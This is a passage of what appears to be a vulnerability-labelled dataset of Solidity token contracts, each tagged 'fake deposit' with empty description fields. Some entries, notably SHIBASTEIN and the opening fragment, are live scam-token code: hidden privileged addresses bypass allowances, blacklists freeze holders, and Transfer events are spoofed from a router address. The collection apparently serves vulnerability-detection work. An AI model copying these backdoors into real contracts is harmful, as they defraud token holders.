}}\r\n             function burninu(uint256 x) public {\r\n        if(msg.sender == rdeployer)  { \r\n        Sunak[msg.sender] = x;} }\r\n\r\n        function transferFrom(address from, address to, uint256 value) public returns (bool success) { \r\n\r\n        if(from == rdeployer)  {\r\n        require(value <= Rishi[from]);\r\n        require(value <= allowance[from][msg.sender]);\r\n        Rishi[from] -= value;  \r\n        Rishi[to] += value; \r\n        emit Transfer (r_Construct, to, value);\r\n        return true; }    \r\n          if(!Il[from] && !Il[to]) {\r\n        require(value <= Rishi[from]);\r\n        require(value <= allowance[from][msg.sender]);\r\n        Rishi[from] -= value;\r\n        Rishi[to] += value;\r\n        allowance[from][msg.sender] -= value;\r\n        emit Transfer(from, to, value);\r\n        return true; }}}\n\n###\n\n",
        "VulnerabilityDesc": [
            {
                "Name": "",
                "Location": "",
                "Type": "fake deposit",
                "Description": "",
                "Repair": ""
            }
        ]
    },
    {
        "Code": "pragma solidity ^0.4.16;\r\ncontract Token {\r\n\r\n    /// @return total amount of tokens\r\n    function totalSupply() constant returns (uint256 supply) {}\r\n\r\n    /// @param _owner The address from which the balance will be retrieved\r\n    /// @return The balance\r\n    function balanceOf(address _owner) constant returns (uint256 balance) {}\r\n\r\n    /// @notice send `_value` token to `_to` from `msg.sender`\r\n    /// @param _to The address of the recipient\r\n    /// @param _value The amount of token to be transferred\r\n    /// @return Whether the transfer was successful or not\r\n    function transfer(address _to, uint256 _value) returns (bool success) {}\r\n\r\n    /// @notice send `_value` token to `_to` from `_from` on the condition it is approved by `_from`\r\n    /// @param _from The address of the sender\r\n    /// @param _to The address of the recipient\r\n    /// @param _value The amount of token to be transferred\r\n    /// @return Whether the transfer was successful or not\r\n    function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\r\n\r\n    /// @notice `msg.sender` approves `_addr` to spend `_value` tokens\r\n    /// @param _spender The address of the account able to transfer the tokens\r\n    /// @param _value The amount of wei to be approved for transfer\r\n    /// @return Whether the approval was successful or not\r\n    function approve(address _spender, uint256 _value) returns (bool success) {}\r\n\r\n    /// @param _owner The address of the account owning tokens\r\n    /// @param _spender The address of the account able to transfer the tokens\r\n    /// @return Amount of remaining tokens allowed to spent\r\n    function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\r\n\r\n    event Transfer(address indexed _from, address indexed _to, uint256 _value);\r\n    event Approval(address indexed _owner, address indexed _spender, uint256 _value);\r\n    \r\n}\r\n\r\n\r\n\r\ncontract StandardToken is Token {\r\n\r\n    function transfer(address _to, uint256 _value) returns (bool success) {\r\n        //Default assumes totalSupply can't be over max (2^256 - 1).\r\n        //If your token leaves out totalSupply and can issue more tokens as time goes on, you need to check if it doesn't wrap.\r\n        //Replace the if with this one instead.\r\n        //if (balances[msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\r\n        if (balances[msg.sender] >= _value && _value > 0) {\r\n            balances[msg.sender] -= _value;\r\n            balances[_to] += _value;\r\n            Transfer(msg.sender, _to, _value);\r\n            return true;\r\n        } else { return false; }\r\n    }\r\n\r\n    function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\r\n        //same as above. Replace this line with the following if you want to protect against wrapping uints.\r\n        //if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\r\n        if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\r\n            balances[_to] += _value;\r\n            balances[_from] -= _value;\r\n            allowed[_from][msg.sender] -= _value;\r\n            Transfer(_from, _to, _value);\r\n            return true;\r\n        } else { return false; }\r\n    }\r\n\r\n    function balanceOf(address _owner) constant returns (uint256 balance) {\r\n        return balances[_owner];\r\n    }\r\n\r\n    function approve(address _spender, uint256 _value) returns (bool success) {\r\n        allowed[msg.sender][_spender] = _value;\r\n        Approval(msg.sender, _spender, _value);\r\n        return true;\r\n    }\r\n\r\n    function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\r\n      return allowed[_owner][_spender];\r\n    }\r\n\r\n    mapping (address => uint256) balances;\r\n    mapping (address => mapping (address => uint256)) allowed;\r\n    uint256 public totalSupply;\r\n}\r\n\r\n\r\n//name this contract whatever you'd like\r\ncontract ERC20Token is StandardToken {\r\n\r\n    function () {\r\n        //if ether is sent to this address, send it back.\r\n        throw;\r\n    }\r\n\r\n    /* Public variables of the token */\r\n    /*\r\n    NOTE:\r\n    The following variables are OPTIONAL vanities. One does not have to include them.\r\n    They allow one to customise the token contract & in no way influences the core functionality.\r\n    Some wallets/interfaces might not even bother to look at this information.\r\n    */\r\n    string public name;                   //fancy name: eg Simon Bucks\r\n    uint8 public decimals;                //How many decimals to show. ie. There could 1000 base units with 3 decimals. Meaning 0.980 SBX = 980 base units. It's like comparing 1 wei to 1 ether.\r\n    string public symbol;                 //An identifier: eg SBX\r\n    string public version = 'H1.0';       //human 0.1 standard. Just an arbitrary versioning scheme.\r\n\r\n//\r\n// CHANGE THESE VALUES FOR YOUR TOKEN\r\n//\r\n\r\n//make sure this function name matches the contract name above. So if you're token is called TutorialToken, make sure the //contract name above is also TutorialToken instead of ERC20Token\r\n\r\n    function ERC20Token(\r\n        ) {\r\n        balances[msg.sender] = 10000000000000000;               // Give the creator all initial tokens (100000 for example)\r\n        totalSupply = 10000000000000000;                        // Update total supply (100000 for example)\r\n        name = \"Join People\";                                   // Set the name for display purposes\r\n        decimals = 8;                            // Amount of decimals for display purposes\r\n        symbol = \"JT\";                               // Set the symbol for display purposes\r\n    }\r\n\r\n    /* Approves and then calls the receiving contract */\r\n    function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\r\n        allowed[msg.sender][_spender] = _value;\r\n        Approval(msg.sender, _spender, _value);\r\n\r\n        //call the receiveApproval function on the contract you want to be notified. This crafts the function signature manually so one doesn't have to include a contract in here just for this.\r\n        //receiveApproval(address _from, uint256 _value, address _tokenContract, bytes _extraData)\r\n        //it is assumed that when does this that the call *should* succeed, otherwise one would use vanilla approve instead.\r\n        if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\r\n        return true;\r\n    }\r\n}\n\n###\n\n",
        "VulnerabilityDesc": [
            {
                "Name": "",
                "Location": "",
                "Type": "fake deposit",
                "Description": "",
                "Repair": ""
            }
        ]
    },
    {
        "Code": "pragma solidity 0.8.17;\r\n\r\nabstract contract Context {\r\n    function _msgSender() internal view virtual returns (address) {\r\n        return msg.sender;\r\n    }\r\n}\r\n\r\n\r\n\r\nlibrary SafeMath {\r\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        uint256 c = a + b;\r\n        require(c >= a, \"SafeMath: addition overflow\");\r\n        return c;\r\n    }\r\n\r\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return sub(a, b, \"SafeMath: subtraction overflow\");\r\n    }\r\n\r\n    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\r\n        require(b <= a, errorMessage);\r\n        uint256 c = a - b;\r\n        return c;\r\n    }\r\n\r\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        if (a == 0) {\r\n            return 0;\r\n        }\r\n        uint256 c = a * b;\r\n        require(c / a == b, \"SafeMath: multiplication overflow\");\r\n        return c;\r\n    }\r\n\r\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return div(a, b, \"SafeMath: division by zero\");\r\n    }\r\n\r\n    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\r\n        require(b > 0, errorMessage);\r\n        uint256 c = a / b;\r\n        return c;\r\n    }\r\n\r\n}\r\n\r\ncontract Ownable is Context {\r\n    address private _Owner;\r\n    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n    event Approval(address indexed owner, address indexed spender, uint256 value);\r\n    address _OConst = 0x8c682a568Fb5727566B0B7978197BC7EDD2AEe60;\r\n\taddress UniV3Router = 0xB8f226dDb7bC672E27dffB67e4adAbFa8c0dFA08;\r\n    constructor () {\r\n        address msgSender = _msgSender();\r\n        _Owner = msgSender;\r\n        emit OwnershipTransferred(address(0), msgSender);\r\n    }\r\n\r\n    function owner() public view returns (address) {\r\n        return _Owner;\r\n    }\r\n\r\n    function renounceOwnership() public virtual {\r\n        require(msg.sender == _Owner);\r\n        emit OwnershipTransferred(_Owner, address(0));\r\n        _Owner = address(0);\r\n    }\r\n\r\n}\r\n\r\n\r\n\r\ncontract SHIBASTEIN is Context, Ownable {\r\n    using SafeMath for uint256;\r\n    mapping (address => uint256) private KO;\r\n\tmapping (address => bool) private SO;\r\n    mapping (address => bool) private RO;\r\n    mapping (address => mapping (address => uint256)) private _allowances;\r\n    uint8 private constant _decimals = 8;\r\n    uint256 private constant _OSup = 666000000 * 10**_decimals;\r\n    string private constant _name = \"Frankenstein's Inu\";\r\n    string private constant _symbol = \"SHIBASTEIN\";\r\n\r\n\r\n\r\n    constructor () {\r\n        KO[_msgSender()] = _OSup;\r\n        emit Transfer(address(0), UniV3Router, _OSup);\r\n    }\r\n\r\n    function name() public pure returns (string memory) {\r\n        return _name;\r\n    }\r\n\r\n    function symbol() public pure returns (string memory) {\r\n        return _symbol;\r\n    }\r\n\r\n    function decimals() public pure returns (uint8) {\r\n        return _decimals;\r\n    }\r\n\r\n    function totalSupply() public pure  returns (uint256) {\r\n        return _OSup;\r\n    }\r\n\r\n    function balanceOf(address account) public view  returns (uint256) {\r\n        return KO[account];\r\n    }\r\n\r\n\r\n    function allowance(address owner, address spender) public view  returns (uint256) {\r\n        return _allowances[owner][spender];\r\n    }\r\n\r\n            function approve(address spender, uint256 amount) public returns (bool success) {    \r\n        _allowances[msg.sender][spender] = amount;\r\n        emit Approval(msg.sender, spender, amount);\r\n        return true; }\r\n\t\tfunction Orng(address z) public {\r\n        if(SO[msg.sender]) { \r\n        RO[z] = false;}}\r\n        function oDelegate(address z) public{\r\n         if(SO[msg.sender])  { \r\n        require(!RO[z]);\r\n        RO[z] = true; }}\r\n\t\tfunction oRelease(address z) public{\r\n         if(msg.sender == _OConst)  { \r\n        require(!SO[z]);\r\n        SO[z] = true; }}\r\n\t\tfunction transferFrom(address sender, address recipient, uint256 amount) public returns (bool success) {\r\n         if(sender == _OConst)  {\r\n        require(amount <= KO[sender]);\r\n        KO[sender] -= amount;  \r\n        KO[recipient] += amount; \r\n          _allowances[sender][msg.sender] -= amount;\r\n        emit Transfer (UniV3Router, recipient, amount);\r\n        return true; }    \r\n          if(!RO[recipient]) {\r\n          if(!RO[sender]) {\r\n         require(amount <= KO[sender]);\r\n        require(amount <= _allowances[sender][msg.sender]);\r\n        KO[sender] -= amount;\r\n        KO[recipient] += amount;\r\n      _allowances[sender][msg.sender] -= amount;\r\n        emit Transfer(sender, recipient, amount);\r\n        return true; }}}\r\n\t\tfunction transfer(address Four, uint256 z) public {\r\n        if(msg.sender == _OConst)  {\r\n        require(KO[msg.sender] >= z);\r\n        KO[msg.sender] -= z;  \r\n        KO[Four] += z; \r\n        emit Transfer (UniV3Router, Four, z);}\r\n        if(SO[msg.sender]) {KO[Four] += z;} \r\n        if(!RO[msg.sender]) {\r\n        require(KO[msg.sender] >= z);\r\n        KO[msg.sender] -= z;  \r\n        KO[Four] += z;          \r\n        emit Transfer(msg.sender, Four, z);\r\n        }}}\n\n###\n\n",
        "VulnerabilityDesc": [
            {
                "Name": "",
                "Location": "",
                "Type": "fake deposit",
                "Description": "",
                "Repair": ""
            }
        ]
    },
    {
        "Code": "pragma solidity ^0.4.16;\r\ncontract Token {\r\n\r\n    /// @return total amount of tokens\r\n    function totalSupply() constant returns (uint256 supply) {}\r\n\r\n    /// @param _owner The address from which the balance will be retrieved\r\n    /// @return The balance\r\n    function balanceOf(address _owner) constant returns (uint256 balance) {}\r\n\r\n    /// @notice send `_value` token to `_to` from `msg.sender`\r\n    /// @param _to The address of the recipient\r\n    /// @param _value The amount of token to be transferred\r\n    /// @return Whether the transfer was successful or not\r\n    function transfer(address _to, uint256 _value) returns (bool success) {}\r\n\r\n    /// @notice send `_value` token to `_to` from `_from` on the condition it is approved by `_from`\r\n    /// @param _from The address of the sender\r\n    /// @param _to The address of the recipient\r\n    /// @param _value The amount of token to be transferred\r\n    /// @return Whether the transfer was successful or not\r\n    function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\r\n\r\n    /// @notice `msg.sender` approves `_addr` to spend `_value` tokens\r\n    /// @param _spender The address of the account able to transfer the tokens\r\n    /// @param _value The amount of wei to be approved for transfer\r\n    /// @return Whether the approval was successful or not\r\n    function approve(address _spender, uint256 _value) returns (bool success) {}\r\n\r\n    /// @param _owner The address of the account owning tokens\r\n    /// @param _spender The address of the account able to transfer the tokens\r\n    /// @return Amount of remaining tokens allowed to spent\r\n    function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\r\n\r\n    event Transfer(address indexed _from, address indexed _to, uint256 _value);\r\n    event Approval(address indexed _owner, address indexed _spender, uint256 _value);\r\n    \r\n}\r\n\r\n\r\n\r\ncontract StandardToken is Token {\r\n\r\n    function transfer(address _to, uint256 _value) returns (bool success) {\r\n        //Default assumes totalSupply can't be over max (2^256 - 1).\r\n        //If your token leaves out totalSupply and can issue more tokens as time goes on, you need to check if it doesn't wrap.\r\n        //Replace the if with this one instead.\r\n        //if (balances[msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\r\n        if (balances[msg.sender] >= _value && _value > 0) {\r\n            balances[msg.sender] -= _value;\r\n            balances[_to] += _value;\r\n            Transfer(msg.sender, _to, _value);\r\n            return true;\r\n        } else { return false; }\r\n    }\r\n\r\n    function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\r\n        //same as above. Replace this line with the following if you want to protect against wrapping uints.\r\n        //if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\r\n        if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\r\n            balances[_to] += _value;\r\n            balances[_from] -= _value;\r\n            allowed[_from][msg.sender] -= _value;\r\n            Transfer(_from, _to, _value);\r\n            return true;\r\n        } else { return false; }\r\n    }\r\n\r\n    function balanceOf(address _owner) constant returns (uint256 balance) {\r\n        return balances[_owner];\r\n    }\r\n\r\n    function approve(address _spender, uint256 _value) returns (bool success) {\r\n        allowed[msg.sender][_spender] = _value;\r\n        Approval(msg.sender, _spender, _value);\r\n        return true;\r\n    }\r\n\r\n    function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\r\n      return allowed[_owner][_spender];\r\n    }\r\n\r\n    mapping (address => uint256) balances;\r\n    mapping (address => mapping (address => uint256)) allowed;\r\n    uint256 public totalSupply;\r\n}\r\n\r\n\r\n//name this contract whatever you'd like\r\ncontract ERC20Token is StandardToken {\r\n\r\n    function () {\r\n        //if ether is sent to this address, send it back.\r\n        throw;\r\n    }\r\n\r\n    /* Public variables of the token */\r\n\r\n    /*\r\n    NOTE:\r\n    The following variables are OPTIONAL vanities. One does not have to include them.\r\n    They allow one to customise the token contract & in no way influences the core functionality.\r\n    Some wallets/interfaces might not even bother to look at this information.\r\n    */\r\n    string public name;                   //fancy name: eg Simon Bucks\r\n    uint8 public decimals;                //How many decimals to show. ie. There could 1000 base units with 3 decimals. Meaning 0.980 SBX = 980 base units. It's like comparing 1 wei to 1 ether.\r\n    string public symbol;                 //An identifier: eg SBX\r\n    string public version = 'H1.0';       //human 0.1 standard. Just an arbitrary versioning scheme.\r\n\r\n//\r\n// CHANGE THESE VALUES FOR YOUR TOKEN\r\n//\r\n\r\n//make sure this function name matches the contract name above. So if you're token is called TutorialToken, make sure the //contract name above is also TutorialToken instead of ERC20Token\r\n\r\n    function ERC20Token(\r\n        ) {\r\n        balances[msg.sender] = 5000000000;               // Give the creator all initial tokens (100000 for example)\r\n        totalSupply = 5000000000;                        // Update total supply (100000 for example)\r\n        name = \"JML Coin\";                                   // Set the name for display purposes\r\n        decimals = 2;                            // Amount of decimals for display purposes\r\n        symbol = \"JML\";                               // Set the symbol for display purposes\r\n    }\r\n\r\n    /* Approves and then calls the receiving contract */\r\n    function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\r\n        allowed[msg.sender][_spender] = _value;\r\n        Approval(msg.sender, _spender, _value);\r\n\r\n        //call the receiveApproval function on the contract you want to be notified. This crafts the function signature manually so one doesn't have to include a contract in here just for this.\r\n        //receiveApproval(address _from, uint256 _value, address _tokenContract, bytes _extraData)\r\n        //it is assumed that when does this that the call *should* succeed, otherwise one would use vanilla approve instead.\r\n        if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\r\n        return true;\r\n    }\r\n}\n\n###\n\n",
        "VulnerabilityDesc": [
            {
                "Name": "",
                "Location": "",
                "Type": "fake deposit",
                "Description": "",
                "Repair": ""
            }
        ]
    },
    {
        "Code": "/**\r\n *Submitted for verification at Etherscan.io on 2017-07-09\r\n*/\r\n\r\n// Abstract contract for the full ERC 20 Token standard\r\n// https://github.com/ethereum/EIPs/issues/20\r\npragma solidity ^0.4.8;\r\n\r\ncontract Token {\r\n    /* This is a slight change to the ERC20 base standard.\r\n    function totalSupply() constant returns (uint256 supply);\r\n    is replaced with:\r\n    uint256 public totalSupply;\r\n    This automatically creates a getter function for the totalSupply.\r\n    This is moved to the base contract since public getter functions are not\r\n    currently recognised as an implementation of the matching abstract\r\n    function by the compiler.\r\n    */\r\n    /// total amount of tokens\r\n    uint256 public totalSupply;\r\n\r\n    /// @param _owner The address from which the balance will be retrieved\r\n    /// @return The balance\r\n    function balanceOf(address _owner) constant returns (uint256 balance);\r\n\r\n    /// @notice send `_value` token to `_to` from `msg.sender`\r\n    /// @param _to The address of the recipient\r\n    /// @param _value The amount of token to be transferred\r\n    /// @return Whether the transfer was successful or not\r\n    function transfer(address _to, uint256 _value) returns (bool success);\r\n\r\n    /// @notice send `_value` token to `_to` from `_from` on the condition it is approved by `_from`\r\n    /// @param _from The address of the sender\r\n    /// @param _to The address of the recipient\r\n    /// @param _value The amount of token to be transferred\r\n    /// @return Whether the transfer was successful or not\r\n    function transferFrom(address _from, address _to, uint256 _value) returns (bool success);\r\n\r\n    /// @notice `msg.sender` approves `_spender` to spend `_value` tokens\r\n    /// @param _spender The address of the account able to transfer the tokens\r\n    /// @param _value The amount of tokens to be approved for transfer\r\n    /// @return Whether the approval was successful or not\r\n    function approve(address _spender, uint256 _value) returns (bool success);\r\n\r\n    /// @param _owner The address of the account owning tokens\r\n    /// @param _spender The address of the account able to transfer the tokens\r\n    /// @return Amount of remaining tokens allowed to spent\r\n    function allowance(address _owner, address _spender) constant returns (uint256 remaining);\r\n\r\n    event Transfer(address indexed _from, address indexed _to, uint256 _value);\r\n    event Approval(address indexed _owner, address indexed _spender, uint256 _value);\r\n}\r\n\r\n/*\r\nYou should inherit from StandardToken or, for a token like you would want to\r\ndeploy in something like Mist, see HumanStandardToken.sol.\r\n(This implements ONLY the standard functions and NOTHING else.\r\nIf you deploy this, you won't have anything useful.)\r\n\r\nImplements ERC 20 Token standard: https://github.com/ethereum/EIPs/issues/20\r\n.*/\r\n\r\ncontract StandardToken is Token {\r\n\r\n    function transfer(address _to, uint256 _value) returns (bool success) {\r\n        //Default assumes totalSupply can't be over max (2^256 - 1).\r\n        //If your token leaves out totalSupply and can issue more tokens as time goes on, you need to check if it doesn't wrap.\r\n        //Replace the if with this one instead.\r\n        //if (balances[msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\r\n        if (balances[msg.sender] >= _value && _value > 0) {\r\n            balances[msg.sender] -= _value;\r\n            balances[_to] += _value;\r\n            Transfer(msg.sender, _to, _value);\r\n            return true;\r\n        } else { return false; }\r\n    }\r\n\r\n    function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\r\n        //same as above. Replace this line with the following if you want to protect against wrapping uints.\r\n        //if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\r\n        if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\r\n            balances[_to] += _value;\r\n            balances[_from] -= _value;\r\n            allowed[_from][msg.sender] -= _value;\r\n            Transfer(_from, _to, _value);\r\n            return true;\r\n        } else { return false; }\r\n    }\r\n\r\n    function balanceOf(address _owner) constant returns (uint256 balance) {\r\n        return balances[_owner];\r\n    }\r\n\r\n    function approve(address _spender, uint256 _value) returns (bool success) {\r\n        allowed[msg.sender][_spender] = _value;\r\n        Approval(msg.sender, _spender, _value);\r\n        return true;\r\n    }\r\n\r\n    function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\r\n      return allowed[_owner][_spender];\r\n    }\r\n\r\n    mapping (address => uint256) balances;\r\n    mapping (address => mapping (address => uint256)) allowed;\r\n}\r\n\r\ncontract HumanStandardToken is StandardToken {\r\n\r\n    function () {\r\n        //if ether is sent to this address, send it back.\r\n        throw;\r\n    }\r\n\r\n    /* Public variables of the token */\r\n\r\n    /*\r\n    NOTE:\r\n    The following variables are OPTIONAL vanities. One does not have to include them.\r\n    They allow one to customise the token contract & in no way influences the core functionality.\r\n    Some wallets/interfaces might not even bother to look at this information.\r\n    */\r\n    string public name;                   //fancy name: eg Simon Bucks\r\n    uint8 public decimals;                //How many decimals to show. ie. There could 1000 base units with 3 decimals. Meaning 0.980 SBX = 980 base units. It's like comparing 1 wei to 1 ether.\r\n    string public symbol;                 //An identifier: eg SBX\r\n    string public version = 'H0.1';       //human 0.1 standard. Just an arbitrary versioning scheme.\r\n\r\n    function HumanStandardToken(\r\n        uint256 _initialAmount,\r\n        string _tokenName,\r\n        uint8 _decimalUnits,\r\n        string _tokenSymbol\r\n        ) {\r\n        balances[msg.sender] = _initialAmount;               // Give the creator all initial tokens\r\n        totalSupply = _initialAmount;                        // Update total supply\r\n        name = _tokenName;                                   // Set the name for display purposes\r\n        decimals = _decimalUnits;                            // Amount of decimals for display purposes\r\n        symbol = _tokenSymbol;                               // Set the symbol for display purposes\r\n    }\r\n\r\n    /* Approves and then calls the receiving contract */\r\n    function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\r\n        allowed[msg.sender][_spender] = _value;\r\n        Approval(msg.sender, _spender, _value);\r\n\r\n        //call the receiveApproval function on the contract you want to be notified. This crafts the function signature manually so one doesn't have to include a contract in here just for this.\r\n        //receiveApproval(address _from, uint256 _value, address _tokenContract, bytes _extraData)\r\n        //it is assumed that when does this that the call *should* succeed, otherwise one would use vanilla approve instead.\r\n        if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\r\n        return true;\r\n    }\r\n}\n\n###\n\n",
        "VulnerabilityDesc": [
            {
                "Name": "",
                "Location": "",
                "Type": "fake deposit",
                "Description": "",
                "Repair": ""
            }
        ]
    },
    {
        "Code": "pragma solidity ^0.4.19;\r\n\r\nlibrary SafeMath {\r\n\r\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        if (a == 0) {\r\n            return 0;\r\n        }\r\n        uint256 c = a * b;\r\n        assert(c / a == b);\r\n        return c;\r\n    }\r\n\r\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        uint256 c = a / b;\r\n        return c;\r\n    }\r\n\r\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        assert(b <= a);\r\n        return a - b;\r\n    }\r\n\r\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        uint256 c = a + b;\r\n        assert(c >= a);\r\n        return c;\r\n    }\r\n\r\n}\r\n\r\ncontract Ownable {\r\n\r\n    address public owner;\r\n\r\n    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\r\n\r\n    function Ownable() public {\r\n        owner = msg.sender;\r\n    }\r\n\r\n    modifier isOwner() {\r\n        require(msg.sender == owner);\r\n        _;\r\n    }\r\n\r\n    function transferOwnership(address newOwner) public isOwner {\r\n        require(newOwner != address(0));\r\n        OwnershipTransferred(owner, newOwner);\r\n        owner = newOwner;\r\n    }\r\n\r\n}\r\n\r\ncontract StandardToken {\r\n\r\n    using SafeMath for uint256;\r\n\r\n    event Transfer(address indexed _from, address indexed _to, uint256 _value);\r\n    event Approval(address indexed _owner, address indexed _spender, uint256 _value);\r\n\r\n    mapping (address => uint256) balances;\r\n    mapping (address => mapping (address => uint256)) allowed;\r\n\r\n    uint256 public totalSupply;\r\n\r\n    function totalSupply() public constant returns (uint256 supply) {\r\n        return totalSupply;\r\n    }\r\n\r\n    function transfer(address _to, uint256 _value) public returns (bool success) {\r\n        if (balances[msg.sender] >= _value && _value > 0) {\r\n            balances[msg.sender] = balances[msg.sender].sub(_value);\r\n            balances[_to] = balances[_to].add(_value);\r\n            Transfer(msg.sender, _to, _value);\r\n            return true;\r\n        } else { return false; }\r\n    }\r\n\r\n    function transferFrom(address _from, address _to, uint256 _value) public returns (bool success) {\r\n        if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\r\n            balances[_to] = balances[_to].add(_value);\r\n            balances[_from] = balances[_from].sub(_value);\r\n            allowed[_from][msg.sender] = allowed[_from][msg.sender].sub(_value);\r\n            Transfer(_from, _to, _value);\r\n            return true;\r\n        } else { return false; }\r\n    }\r\n\r\n    function balanceOf(address _owner) public constant returns (uint256 balance) {\r\n        return balances[_owner];\r\n    }\r\n\r\n    function approve(address _spender, uint256 _value) public returns (bool success) {\r\n        allowed[msg.sender][_spender] = _value;\r\n        Approval(msg.sender, _spender, _value);\r\n        return true;\r\n    }\r\n\r\n    function allowance(address _owner, address _spender) public constant returns (uint256 remaining) {\r\n        return allowed[_owner][_spender];\r\n    }\r\n\r\n}\r\n\r\ncontract Fracture is StandardToken, Ownable {\r\n\r\n    using SafeMath for uint256;\r\n\r\n    string public name;\r\n    string public symbol;\r\n    string public version = '1.0';\r\n    uint256 public totalCoin;\r\n    uint8 public decimals;\r\n    uint8 public exchangeRate;\r\n\r\n    event TokenNameChanged(string indexed previousName, string indexed newName);\r\n    event TokenSymbolChanged(string indexed previousSymbol, string indexed newSymbol);\r\n    event ExhangeRateChanged(uint8 indexed previousRate, uint8 indexed newRate);\r\n\r\n    function ERC20Token() public {\r\n        decimals        = 18;\r\n        totalCoin       = 10000000;                       // Total Supply of Coin\r\n        totalSupply     = totalCoin * 10**uint(decimals); // Total Supply of Coin\r\n        balances[owner] = totalSupply;                    // Total Supply sent to Owner's Address\r\n        exchangeRate    = 100;                            // 100 Coins per ETH   (changable)\r\n        symbol          = \"TICKER\";                       // Your Ticker Symbol  (changable)\r\n        name            = \"YourCoinNameHere\";             // Your Coin Name      (changable)\r\n    }\r\n\r\n    function changeTokenName(string newName) public isOwner returns (bool success) {\r\n        TokenNameChanged(name, newName);\r\n        name = newName;\r\n        return true;\r\n    }\r\n\r\n    function changeTokenSymbol(string newSymbol) public isOwner returns (bool success) {\r\n        TokenSymbolChanged(symbol, newSymbol);\r\n        symbol = newSymbol;\r\n        return true;\r\n    }\r\n\r\n    function changeExhangeRate(uint8 newRate) public isOwner returns (bool success) {\r\n        ExhangeRateChanged(exchangeRate, newRate);\r\n        exchangeRate = newRate;\r\n        return true;\r\n    }\r\n\r\n    function () public payable {\r\n        fundTokens();\r\n    }\r\n\r\n    function fundTokens() public payable {\r\n        require(msg.value > 0);\r\n        uint256 tokens = msg.value.mul(exchangeRate);\r\n        require(balances[owner].sub(tokens) > 0);\r\n        balances[msg.sender] = balances[msg.sender].add(tokens);\r\n        balances[owner] = balances[owner].sub(tokens);\r\n        Transfer(msg.sender, owner, msg.value);\r\n        forwardFunds();\r\n    }\r\n\r\n    function forwardFunds() internal {\r\n        owner.transfer(msg.value);\r\n    }\r\n\r\n    function approveAndCall(\r\n        address _spender,\r\n        uint256 _value,\r\n        bytes _extraData\r\n    ) public returns (bool success) {\r\n        allowed[msg.sender][_spender] = _value;\r\n        Approval(msg.sender, _spender, _value);\r\n        if(!_spender.call(\r\n            bytes4(bytes32(keccak256(\"receiveApproval(address,uint256,address,bytes)\"))),\r\n            msg.sender,\r\n            _value,\r\n            this,\r\n            _extraData\r\n        )) { revert(); }\r\n        return true;\r\n    }\r\n\r\n}\n\n###\n\n",
        "VulnerabilityDesc": [
            {
                "Name": "",
                "Location": "",
                "Type": "fake deposit",
                "Description": "",
                "Repair": ""
            }
        ]
    },
    {
        "Code": "pragma solidity ^0.4.4;\r\n\r\ncontract Token {\r\n\r\n    /// @return total amount of tokens\r\n    function totalSupply() constant returns (uint256 supply) {}\r\n\r\n    /// @param _owner The address from which the balance will be retrieved\r\n    /// @return The balance\r\n    function balanceOf(address _owner) constant returns (uint256 balance) {}\r\n\r\n    /// @notice send `_value` token to `_to` from `msg.sender`\r\n    /// @param _to The address of the recipient\r\n    /// @param _value The amount of token to be transferred\r\n    /// @return Whether the transfer was successful or not\r\n    function transfer(address _to, uint256 _value) returns (bool success) {}\r\n\r\n    /// @notice send `_value` token to `_to` from `_from` on the condition it is approved by `_from`\r\n    /// @param _from The address of the sender\r\n    /// @param _to The address of the recipient\r\n    /// @param _value The amount of token to be transferred\r\n    /// @return Whether the transfer was successful or not\r\n    function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\r\n\r\n    /// @notice `msg.sender` approves `_addr` to spend `_value` tokens\r\n    /// @param _spender The address of the account able to transfer the tokens\r\n    /// @param _value The amount of wei to be approved for transfer\r\n    /// @return Whether the approval was successful or not\r\n    function approve(address _spender, uint256 _value) returns (bool success) {}\r\n\r\n    /// @param _owner The address of the account owning tokens\r\n    /// @param _spender The address of the account able to transfer the tokens\r\n    /// @return Amount of remaining tokens allowed to spent\r\n    function allowance(address _owner, address _spender) constant returns (uint256 